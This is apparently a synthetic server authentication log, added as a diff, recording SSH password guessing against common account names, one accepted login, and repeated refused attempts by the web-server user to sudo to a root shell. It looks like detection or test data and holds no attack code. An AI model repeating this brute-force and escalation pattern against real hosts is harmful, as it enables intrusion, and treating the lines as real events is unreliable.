+Apr 29 04:32:34 prod-server-01 sshd[6123]: Failed password for deploy from 192.168.100.55 port 49537 ssh2
+Apr 29 04:32:36 prod-server-01 sshd[2275]: Failed password for admin from 192.168.100.55 port 50641 ssh2
+Apr 29 04:32:38 prod-server-01 sshd[7422]: Failed password for admin from 185.220.101.45 port 14242 ssh2
+Apr 29 04:32:41 prod-server-01 sshd[9349]: Failed password for pi from 194.165.16.11 port 50631 ssh2
+Apr 29 04:32:44 prod-server-01 sshd[8109]: Failed password for deploy from 194.165.16.11 port 18893 ssh2
+Apr 29 04:32:47 prod-server-01 sshd[1836]: Failed password for admin from 192.168.100.55 port 54413 ssh2
+Apr 29 04:32:48 prod-server-01 sshd[8695]: Failed password for root from 45.33.32.156 port 16972 ssh2
+Apr 29 04:32:51 prod-server-01 sshd[8456]: Failed password for ubuntu from 45.33.32.156 port 7925 ssh2
+Apr 29 04:32:52 prod-server-01 sshd[3349]: Accepted password for ubuntu from 45.33.32.156 port 15204 ssh2
+Apr 29 04:32:52 prod-server-01 sshd[1155]: Failed password for deploy from 194.165.16.11 port 7506 ssh2
+Apr 29 04:32:54 prod-server-01 sshd[3906]: Failed password for deploy from 192.168.100.55 port 45645 ssh2
+Apr 29 04:32:55 prod-server-01 sshd[9084]: Failed password for postgres from 192.168.100.55 port 7800 ssh2
+Apr 29 04:32:58 prod-server-01 sshd[5783]: Failed password for ubuntu from 185.220.101.45 port 48488 ssh2
+Apr 29 04:33:00 prod-server-01 sshd[5814]: Failed password for postgres from 194.165.16.11 port 25062 ssh2
+Apr 29 04:33:02 prod-server-01 sshd[9797]: Failed password for oracle from 91.240.118.222 port 27513 ssh2
+Apr 29 04:33:04 prod-server-01 sshd[4610]: Failed password for deploy from 45.33.32.156 port 23448 ssh2
+Apr 29 04:33:05 prod-server-01 sshd[7517]: Failed password for postgres from 194.165.16.11 port 24659 ssh2
+Apr 29 04:33:07 prod-server-01 sshd[7650]: Failed password for admin from 194.165.16.11 port 46935 ssh2
+Apr 29 04:33:09 prod-server-01 sshd[1449]: Failed password for deploy from 185.220.101.45 port 22164 ssh2
+Apr 29 04:33:10 prod-server-01 sshd[7950]: Failed password for admin from 194.165.16.11 port 57047 ssh2
+Apr 29 04:33:12 prod-server-01 sshd[9650]: Failed password for pi from 185.220.101.45 port 47165 ssh2
+Apr 29 04:33:15 prod-server-01 sshd[3667]: Failed password for root from 194.165.16.11 port 41164 ssh2
+Apr 29 04:33:18 prod-server-01 sshd[9794]: Failed password for ubuntu from 45.33.32.156 port 56010 ssh2
+Apr 29 04:33:21 prod-server-01 sshd[3685]: Failed password for oracle from 194.165.16.11 port 60436 ssh2
+Apr 29 04:33:22 prod-server-01 sshd[9710]: Failed password for root from 194.165.16.11 port 30706 ssh2
+Apr 29 04:33:23 prod-server-01 sshd[5913]: Failed password for admin from 185.220.101.45 port 45147 ssh2
+Apr 29 04:33:24 prod-server-01 sshd[8053]: Failed password for ubuntu from 185.220.101.45 port 26610 ssh2
+Apr 29 04:33:25 prod-server-01 sshd[5759]: Failed password for ubuntu from 91.240.118.222 port 11806 ssh2
+Apr 29 04:33:26 prod-server-01 sshd[1377]: Failed password for oracle from 91.240.118.222 port 60273 ssh2
+Apr 29 04:33:29 prod-server-01 sshd[7518]: Failed password for deploy from 45.33.32.156 port 34377 ssh2
+Apr 29 04:33:30 prod-server-01 sshd[5258]: Failed password for deploy from 45.33.32.156 port 38526 ssh2
+Apr 29 04:33:33 prod-server-01 sshd[2822]: Failed password for postgres from 91.240.118.222 port 6024 ssh2
+Apr 29 04:33:35 prod-server-01 sshd[3949]: Failed password for postgres from 192.168.100.55 port 46784 ssh2
+Apr 29 04:33:36 prod-server-01 sshd[3812]: Failed password for postgres from 194.165.16.11 port 10422 ssh2
+Apr 29 04:33:39 prod-server-01 sshd[5209]: Failed password for postgres from 45.33.32.156 port 11897 ssh2
+Apr 29 04:33:41 prod-server-01 sshd[1438]: Failed password for deploy from 91.240.118.222 port 60031 ssh2
+Apr 29 04:33:44 prod-server-01 sshd[4720]: Failed password for oracle from 192.168.100.55 port 24459 ssh2
+Apr 29 04:33:46 prod-server-01 sshd[4775]: Failed password for pi from 45.33.32.156 port 5411 ssh2
+Apr 29 04:33:49 prod-server-01 sshd[4373]: Failed password for admin from 91.240.118.222 port 10454 ssh2
+Apr 29 04:33:52 prod-server-01 sshd[5653]: Failed password for pi from 185.220.101.45 port 21699 ssh2
+Apr 29 04:33:54 prod-server-01 sshd[1872]: Failed password for deploy from 194.165.16.11 port 30924 ssh2
+Apr 29 04:33:55 prod-server-01 sshd[7798]: Failed password for admin from 192.168.100.55 port 52673 ssh2
+Apr 29 04:33:56 prod-server-01 sshd[2608]: Failed password for deploy from 91.240.118.222 port 3909 ssh2
+Apr 29 04:33:57 prod-server-01 sshd[6743]: Failed password for admin from 192.168.100.55 port 4031 ssh2
+Apr 29 04:33:59 prod-server-01 sshd[3197]: Failed password for root from 194.165.16.11 port 45166 ssh2
+Apr 29 04:34:00 prod-server-01 sshd[9687]: Failed password for pi from 192.168.100.55 port 35680 ssh2
+Apr 29 04:34:01 prod-server-01 sshd[4796]: Failed password for ubuntu from 185.220.101.45 port 25475 ssh2
+Apr 29 04:34:04 prod-server-01 sshd[9369]: Failed password for admin from 91.240.118.222 port 1129 ssh2
+Apr 29 04:34:05 prod-server-01 sshd[1712]: Failed password for pi from 185.220.101.45 port 43859 ssh2
+Apr 29 04:34:06 prod-server-01 sshd[6819]: Failed password for postgres from 185.220.101.45 port 31889 ssh2
+Apr 29 04:34:07 prod-server-01 sshd[9589]: Failed password for postgres from 194.165.16.11 port 49395 ssh2
+Apr 29 04:34:10 prod-server-01 sshd[1407]: Failed password for postgres from 91.240.118.222 port 8811 ssh2
+Apr 29 04:34:11 prod-server-01 sshd[9625]: Failed password for pi from 91.240.118.222 port 45856 ssh2
+Apr 29 04:34:14 prod-server-01 sshd[7578]: Failed password for ubuntu from 185.220.101.45 port 50929 ssh2
+Apr 29 04:34:15 prod-server-01 sshd[8956]: Failed password for admin from 192.168.100.55 port 50520 ssh2
+Apr 29 04:34:18 prod-server-01 sshd[2344]: Failed password for deploy from 45.33.32.156 port 53438 ssh2
+Apr 29 04:34:21 prod-server-01 sshd[8638]: Failed password for root from 194.165.16.11 port 45012 ssh2
+Apr 29 04:34:24 prod-server-01 sshd[3649]: Failed password for postgres from 185.220.101.45 port 37654 ssh2
+Apr 29 04:34:27 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:34:34 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:34:36 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:34:48 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:34:50 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:34:57 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:35:07 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:35:17 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:35:20 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:35:28 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:35:33 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:35:52 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:35:54 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:36:05 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:36:13 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:36:28 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:36:31 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:36:38 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:36:40 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:36:48 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:36:53 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:37:13 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:37:16 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:37:32 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:37:34 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:37:44 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:37:47 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:37:57 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:38:02 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:38:12 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:38:17 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:38:22 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:38:31 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:38:51 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:39:00 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:39:19 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:39:25 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:39:40 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:39:45 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:39:51 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:40:01 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:40:14 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:40:21 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:40:39 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:40:48 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:41:00 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:41:06 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:41:20 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:41:23 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:41:30 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:41:36 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:41:52 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:42:02 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:42:13 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:42:17 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:42:25 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:42:34 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:42:45 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:42:50 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:43:08 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:43:11 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:43:18 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:43:25 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:43:42 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:43:47 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:44:07 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:44:14 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:44:20 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:44:27 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:44:36 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:44:43 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:44:48 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:44:58 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:45:08 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:45:15 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:45:29 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:45:37 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:45:49 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:45:55 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:46:10 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:46:18 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:46:25 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:46:34 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:46:42 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:46:49 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:47:06 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:47:08 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:47:24 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:47:26 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:47:40 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:47:42 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:48:01 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:48:07 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:48:15 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:48:22 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:48:37 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:48:43 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:48:57 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:49:04 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:49:15 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:49:22 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:49:33 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:49:40 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:49:46 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:49:53 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:50:08 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:50:15 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:50:22 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:50:25 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:50:30 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:50:34 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:50:54 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:51:02 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:51:13 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:51:15 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:51:27 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:51:30 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:51:45 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:51:47 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:51:53 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:52:03 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:52:10 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:52:14 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:52:32 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:52:37 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:52:56 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:53:00 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:53:14 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:53:20 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:53:27 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:53:29 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:53:39 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:53:47 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:54:02 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:54:05 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:54:17 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:54:23 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:54:35 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:54:39 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:54:47 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:54:50 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:55:09 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:55:15 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:55:28 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:55:32 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:55:48 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:55:51 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:55:58 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:56:04 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:56:18 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:56:20 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:56:29 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:56:32 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:56:48 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:56:53 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:57:04 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
+Apr 29 04:57:06 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:57:26 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:57:33 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:57:47 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:57:49 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:58:01 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=10.10.10.5
+Apr 29 04:58:04 prod-server-01 sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
+Apr 29 04:58:20 prod-server-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 rhost=192.168.1.200
